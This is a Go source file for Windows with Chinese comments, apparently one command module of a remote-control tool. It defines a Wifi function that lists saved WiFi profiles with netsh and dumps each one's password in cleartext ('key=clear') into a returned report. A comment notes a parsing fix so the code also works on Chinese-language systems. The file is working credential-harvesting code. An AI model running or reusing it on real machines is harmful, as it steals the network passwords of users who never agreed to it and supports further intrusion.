//go:build windows

package commands

import (
	"fmt"
	"os/exec"
	"strings"
)

// Wifi 提取 Windows 保存的 WiFi 配置及密码。
// 【修复】不再按英文 "Profile" 过滤：中文系统 netsh 输出为 "所有用户配置文件"，
// 统一按 ": " 分隔符解析配置名（英文/中文系统均可用）。
func Wifi() ([]byte, error) {
	out, err := exec.Command("netsh", "wlan", "show", "profiles").Output()
	if err != nil {
		return nil, fmt.Errorf("获取WiFi列表失败: %v", err)
	}

	var result strings.Builder
	result.WriteString("=== WiFi Profiles ===\n")

	for _, line := range strings.Split(string(out), "\n") {
		// 配置行格式（中英文一致）："所有用户配置文件 : <name>" 或 "All User Profile : <name>"
		if idx := strings.Index(line, ":"); idx > 0 {
			name := strings.TrimSpace(line[idx+1:])
			if name == "" {
				continue
			}
			keyOut, err := exec.Command("netsh", "wlan", "show", "profile", "name="+name, "key=clear").Output()
			if err != nil {
				// 无权限时明确提示原因，避免静默跳过
				result.WriteString(fmt.Sprintf("\n--- %s ---\n[!] 读取密码失败（可能需要管理员权限）: %v\n", name, err))
				continue
			}
			result.WriteString(fmt.Sprintf("\n--- %s ---\n", name))
			result.Write(keyOut)
		}
	}
	return []byte(result.String()), nil
}
